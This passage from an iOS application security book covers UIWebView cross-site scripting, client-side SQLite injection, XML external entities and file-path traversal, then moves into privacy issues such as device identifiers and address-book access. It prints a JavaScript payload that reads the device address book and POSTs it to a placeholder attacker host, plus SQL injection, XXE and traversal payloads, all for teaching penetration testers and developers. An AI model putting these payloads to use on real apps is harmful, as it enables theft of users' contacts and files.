call
When content is read from via some Objective-C logic and is then executed in the document object model
(DOM) of the application using the UIWebView stringByEvaluatingJavaScriptFromString delegate method.
Assuming a cross-site scripting vulnerability occurs by one of these vectors, exploiting the web view to steal
content from the device may be possible. A sample exploit payload to perform such an attack to download the
device’s address book database is described next.
The following JavaScript exploit payload reads the contents of the AddressBook .sqlitedb file, base64, encodes
it (code omitted for brevity), and then sends it as a POST request to the http://x.x.x.x/readaddressbook.py
script:
function reqListener () {
var http = new XMLHttpRequest();
var url = "http://x.x.x.x/readaddressbook.py";
b = base64ArrayBuffer(this.response)
var params = "ab64=" + b;
http.open("POST", url, true);
http.setRequestHeader("Content-type","plain/text");
http.setRequestHeader("Content-length", params.length);
http.setRequestHeader("Connection", "close");
http.onreadystatechange = function() {
if(http.readyState == 4 && http.status == 200) {
alert('Addressbook sent');
}
}
http.send(params);
}
var file = "file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb";
var oReq = new XMLHttpRequest();
oReq.responseType = 'arraybuffer';
oReq.onload = reqListener;
oReq.open("get", file, true);
oReq.setRequestHeader("Connection", "close");
oReq.send();
The exploit payload is relatively agnostic and can be used to steal content off the device providing the
application is suitably permissioned to access it.
SKYPE iOS APPLICATION CROSS-SITE SCRIPTING
The Skype iOS application was affected by a cross-site scripting vulnerability when displaying a user’s full
name for an incoming call.
The Skype app used a local HTML file as a template for a UIWebView without sanitizing the user’s full
name. In this instance the attacker could access the local filesystem because the file was being loaded in
the local context; a proof of concept exploit for the vulnerability was developed to retrieve and upload the
device’s address book. For further information refer to the following post:
https://www.superevr.com/blog/2011/skype-xss-explained.
Injecting into Client-Side Data Stores
Mobile applications often need to store data to the device, and while many ways exist to store data on an iOS
device, one of the simplest and most common ways to achieve this is to use a SQLite data store. Much like when
SQL is used within web applications, if SQL statements are not formed securely, apps can find themselves
vulnerable to SQL injection. The following resource provides a general introduction to SQL injection:
https://www.owasp.org/index.php/SQL_Injection.
To perform data access on client-side SQLite databases, iOS provides the built-in SQLite data library. If using
SQLite, the application will be linked to the libsqlite3.dylib library.
Similarly to traditional web applications, SQL injection in iOS applications occurs when unsanitized user input
is used to construct a dynamic SQL statement. To compile a SQL statement, the statement must first be defined
as a constant character array and passed to one of the SQLite prepare methods.
To illustrate how SQL injection in a client-side data store can represent a security problem, consider the
example of a social networking application reading multiple users’ status messages and then storing them for
offline viewing in a SQLite database. The application reads from multiple user feeds and renders a link to the
user’s profile and her display name in the app. The following code, for this purpose, is a dynamically created
SQLite statement that is executed each time the user’s message feed is read:
sqlite3 *database;
sqlite3_stmt *statement;
if(sqlite3_open([databasePath UTF8String], &database) == SQLITE_OK)
{
NSString *sql = [NSString stringWithFormat:@"INSERT INTO messages \
VALUES('1', '%@','%@','%@')", msg, user, displayname];
const char *insert_stmt = [sql UTF8String];
sqlite3_prepare_v2(database, insert_stmt, -1, &statement, NULL);
if (sqlite3_step(statement) == SQLITE_DONE)
In the preceding code excerpt, the developer first opens the SQLite database whose name corresponds to the
string in the databasePath variable. If the database is successfully opened, an NSString object is initialized to
create a dynamic SQL statement using the unsanitized, attacker-controlled msg, user, and displayname variables.
The SQL query is then converted to a constant character array and compiled as a SQL statement using the
sqlite3_prepare_v2 method. Finally, the SQL statement is executed using the sqlite3_step method.
Because the parameters that are used to construct the statement originate from the user, and the statement is
constructed by concatenation, the resulting statement can be user controlled. For example, consider a malicious
user setting a status message of his or her social network page to the following:
Check out my cool site http://mdsecattacker.net', 'Goodguy', 'Good guy');/*
When the victim browses to the attacker’s page, this would result in the following SQL query effectively being
executed:
INSERT INTO messages VALUES('1', 'Check out my cool site
http://mobileapphacker.com', 'Goodguy', 'Good guy');
/*','originaluser','Original User');
In this example the attacker is able to control the subsequent fields in the query and make the message appear
as if it originated from another user who may be more reputable or trustworthy to the victim, making the user
more inclined to click on the link to the attacker-controlled site. Although this example may seem somewhat
contrived, it is actually a common problem for applications that use SQLite as a client-side data store. The
consequences of such injections are typically application-dependent, because SQLite does not offer the same
rich functionality found in server-side databases such as Oracle or MySQL, wherein SQL injection
vulnerabilities may result in command execution, for example.
Injecting into XML
XML is widely used in web and mobile applications to represent data structures, and it is also common to see
XML being parsed from web application responses and from downloads made by apps. If an attacker is able to
control XML content being parsed then this can give rise to the well-understood attacks associated with XML
processors. The iOS SDK provides two options for parsing XML; the NSXMLParser and libxml2. However, a
number of popular third-party XML parser implementations are also widely used in iOS apps.
One common attack often associated with XML parsers is known as the “billion laughs” attack
(http://en.wikipedia.org/wiki/Billion_laughs), in which the parser is supplied with a number of nested
entities, which when expanded, can cause a Denial-of-Service condition. The default parsers included with the
iOS SDK are not vulnerable to this attack; when a nested entity is detected the NSXMLParser will raise an
NSXMLParserEntityRefLoopError exception, while the LibXML2 parser will throw an error stating “Detected an
entity reference loop.”
Another common attack scenario with XML parsers is the parsing of external XML entities. If you are not
familiar with external entity injection attacks you should familiarize yourself with the topic; OWASP provides a
useful description (https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing). Parsing of
external XML entities is not enabled by default in the NSXMLParser class, but was enabled by default in the
LibXML2 parser up to version 2.9. To enable the parsing of external entities in the NSXMLParser, the developer
must explicitly set the setShouldResolveExternalEntities option, which causes the
foundExternalEntityDeclarationWithName delegate method to be invoked whenever an entity is encountered
within an XML document being parsed.
To illustrate such an attack, consider an application that allows users to skin the application, dynamically
adjusting the user interface of the application based on a skin configuration. The skin configuration files are
XML documents, which can be shared between users on the application’s social networking site. A sample
implementation for parsing the XML may look as follows:
- (void)parseXMLStr:(NSString *)xmlStr {
BOOL success;
NSData *xmlData = [xmlStr dataUsingEncoding:NSUTF8StringEncoding];
NSXMLParser *addressParser = [[NSXMLParser alloc] initWithData:xmlData];
[addressParser setDelegate:self];
[addressParser setShouldResolveExternalEntities:YES];
success = [addressParser parse];
}
- (void)parser:(NSXMLParser *)parser didStartElement: \
(NSString*)elementName namespaceURI:(NSString *)namespaceURI \
qualifiedName:(NSString*)qName attributes:(NSDictionary *)attributeDict {}
- (void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string {}
- (void)parser:foundExternalEntityDeclarationWithName:publicID:systemID {}
- (void)parser:(NSXMLParser *)parser parseErrorOccurred:(NSError *)parseError{
NSLog(@"Error %i, Description: %@", [parseError code],
[[parser parserError] localizedDescription]);
}
In this example the application has set the setShouldResolveExternal Entities constant to yes, meaning that
the application will parse and resolve external entities found within a document, leaving the application
vulnerable to external entity injection attacks. Exploitation of traditional external entity injection vulnerabilities
can result in access to arbitrary files; however, in this case exploitation is generally non-trivial because the files
that can be accessed are constrained by the application’s sandbox restrictions. It is, however, possible to force
the parser to connect to arbitrary endpoints using a URL handler, which could potentially be leveraged for other
types of attack such as exploitation of web applications running on the user’s local network. A malicious skin
configuration file may look as follows:
]>
&xxe;
This simple example would initiate a request from the app to the web server running at http://192.168.1.1.
Injecting into File-Handling Routines
Although less common, you may at times find that you have an injection vulnerability into a file-handling
routine in an iOS application, where you’re able to control all or part of the filename being processed. This type
of scenario can often lead to vulnerable conditions if appropriate sanitization and canonicalization are not
carried out when constructing filenames. Disregarding the standard C file-handling routines, two main classes
are used for file handling in the iOS SDK: NSFileManager and NSFileHandle.
The NSFileManager class offers robust filesystem interaction with a number of instance methods to perform file
operations whereas the NSFileHandle class provides a more advanced means of interacting with a file descriptor.
NSFileHandle class provides interfaces that are closer to the traditional C file operations and provides a means to
directly go to offsets within files and leaves the responsibility of closing the handle to the developer. Both of
these classes can be affected by directory traversal issues when an attacker can control part of the filename.
To illustrate issues that can occur when dealing with filesystem interactions, consider a fictitious social
networking application that retrieves a list of your friends and saves them to profiles on the device so that they
can be viewed offline. In this scenario, the server-side web application allows users to upload their profile
images, which are later stored by the mobile application in an images directory under the name of the friend; for
example Documents/images/joebloggs.png. In addition to displaying images, the application also renders users’
profiles by creating a local HTML file for the user, which is stored in the Documents/profile directory under the
name of the friend and opened in a UIWebView whenever the user views this friend’s profile in the application.
Because no sanitization is performed on uploaded filenames by the web app, malicious users are able to upload
a profile picture that is not an image and can instead contain arbitrary content. They are also able to change
their name on the site to any string they choose. When the mobile application downloads the user’s profile
image, it uses code similar to the following to store it:
NSString *filePath = [NSString stringWithFormat:@"%@/images/%@.png",
documentsDirectory, friendName];
[imageFile writeToFile:filePath atomically:YES
encoding:NSUTF8StringEncoding error:&error];
In this example imageFile is an NSString value that has been read from the image, and filePath is created
based on NSDocumentDirectory concatenated with the images directory and the friend’s name. A malicious user
can change his profile name to traverse out of the images directory and into the profile directory to overwrite
the profile of any friend the user has. The attacker also controls the content of the file as it is populated from his
user profile. The response from the server-side web service may look as follows:
{
"Friend": {
"Name": "../profile/janeblogs.html",
"ContactNumber": "",
"About": "",
"Likes": "",
"Dislikes": "",
}
}
The attack payload forces the writeToFile method to traverse to the parent directory into the profile folder
where it overwrites the profile of “Jane Blogs” with some malicious HTML. If you can recall from the cross-site
scripting attacks discussion from earlier in this chapter, a UIWebView opened with the local filesystem origin has
the ability to access files on the filesystem, so attackers could potentially leverage this issue to steal files from
the device.
Summary
In this chapter you have learned that the attack surface for an iOS application is quite significant, and a number
of different ways exist in which to attack an application from both whitebox (informed, with source code) and
blackbox (without source code) perspectives. The chapter has explained important topics such as transport
security and data storage, including ways to not only identify such issues but also exploit them.
A key topic that this chapter focuses on is how an attacker can use static patching and instrumentation to
manipulate the behavior of an application to bypass security controls. Binary defenses are expected to become
much more mainstream in mobile applications in the future, and if you perform penetration tests of iOS
applications you likely will need skills to assess and attempt to defeat these measures.
CHAPTER 4
Identifying iOS Implementation Insecurities
Armed with the knowledge from Chapter 3, you are well equipped to understand the mechanisms for testing iOS
applications. However, in addition to the various attack scenarios, you should consider a number of other things
when developing or assessing an iOS application. Indeed, many weaknesses can arise as a consequence of using
certain APIs in the iOS SDK. This chapter documents the avenues in which due to lack of awareness, developers
can inadvertently expose their applications to risk through these API side effects. Where applicable, the chapter
also details remedial action and ways to secure implementations.
Disclosing Personally Identifiable Information
Although the issue is not specific to iOS, handling personal data is a serious concern for mobile applications and
one that should be considered during the design phase of an application and stringently investigated as part of
any assessment. Any data that can be used to uniquely identify users, their habits, locations, actions, or the
device should be treated with particular care. Such information may not strictly be considered personally
identifiable information (PII), but it can be used to track the user, which can also be considered an infringement
of privacy.
Typically, when you review how a mobile application handles personal data, you should consider the following
attack vectors:
How is personal or privacy-related data logged or stored, not just on the client but also the server?
How is personal or privacy-related data protected when communicated across a network?
Is the personal or privacy-related data that is used by the application relevant and appropriate to its use case?
Is any personal data exposed to other applications on the device through the use of inter-process
communication (IPC) mechanisms or shared containers?
This section details some of the types of personal or privacy-related data that you may encounter when
reviewing an iOS application.
Handling Device Identifiers
Every iOS device has a 40-character-long hex value, known as the unique device identifier (UDID), that
uniquely identifies the device. You can find the UDID for your device by clicking on the Serial Number option
under the device Summary tab in iTunes.
Prior to iOS 6, third-party applications could access the UDID using the iOS public APIs. This lead to it not only
being used to track users for marketing and advertising purposes, but also in some cases for nefarious reasons.
Apple responded to this abuse by revoking access to the UDID for third-party applications.
However, legitimate reasons can sometimes exist for an application to identify a user or device, and some users
may be happy to receive advertisements. At present there are two methods of identifying a device, and you
should consider how they are used or protected when assessing an application:
AdSupport framework—Introduced in iOS 6 specifically for applications that use advertisements, this
framework exposes the advertisingIdentifier property (see
https://developer.apple.com/LIBRARY/ios/documentation/AdSupport/Reference/ASIdentifierManager_Ref/index.html#//apple_ref/occ/instp/ASIdentifierManager/advertisingIdentifier
This property returns a unique identifier that is static across all applications but can be manually reset by the
user via the Settings ➢ Privacy ➢ Advertising ➢ Reset Advertising Identifier setting. The identifier will also
be reset automatically if you reset or erase your device. The use of this identifier is also subject to certain
restrictions that are dependent upon the value of the Limit Ad Tracking setting that is found in the
Advertising settings category of the device. If the flag is enabled, applications should use the identifier only
for frequency capping, conversion events, estimating the number of unique users, security and fraud
detection, and debugging. However, enforcing this is difficult because if the data is aggregated and processed
on the server side, Apple has no way to concretely ascertain how it is being used, and so misuse of this
property can raise privacy concerns.
UIDevice class—An alternate method of identifying the device is the identifierForVendor property (see
https://developer.apple.com/library/ios/documentation/UIKit/Reference/UIDevice_Class/index.html#//apple_ref/doc/uid/TP40006902-
CH3-SW11) in the UIDevice class. This property returns a unique identifier for all applications from the same
vendor, where a vendor is determined by data provided from the App Store or the app's bundle identifier. As
such, this property can be used to track a device only by a particular vendor. Removing the last application
from the vendor causes the identifier to be removed, or if an application from the vendor is later reinstalled
the identifier is reset. Nevertheless, you should ensure that this identifier is not unnecessarily exposed.
Processing the Address Book
The address book is perhaps one of the most sensitive data stores on an iOS device, and therefore understanding
how it's used in an application and whether content is intentionally or inadvertently exposed is important.
Before an application is able to access the address book it must first request permission from the user. If access
is granted, an application has carte blanche access to the address book until the user manually revokes the
permission from the Settings ➢ Privacy ➢ Contacts menu options. Some applications have abused this
privilege, namely the “Find and Call” application (see http://www.wired.com/2012/07/first-ios-malware-
found/) that uploaded users' address books and GPS coordinates to a remote server located in Russia.
When you review an iOS application, your methodology should include an investigation of whether an
application can access the device's address book, what data it reads from it, and what it ultimately does with that
data. Applications that access the address book will likely use the AddressBook framework (see
https://developer.apple.com/library/ios/documentation/addressbook/reference/AddressBook_iPhoneOS_Framework/_index.html#//apple_ref/doc/uid/TP40007212
The use of ABAddressBookCopyArrayOfAllPeople and related methods should come under particular scrutiny. To
help you identify whether an application uses this API call, consider using the Adios tool from Veracode (see
https://www.veracode.com/security-tools/adios), which can automate this task for you.
Handling Geolocation Data
Apple provides a means of accessing the device's geolocation features using the Core Location framework.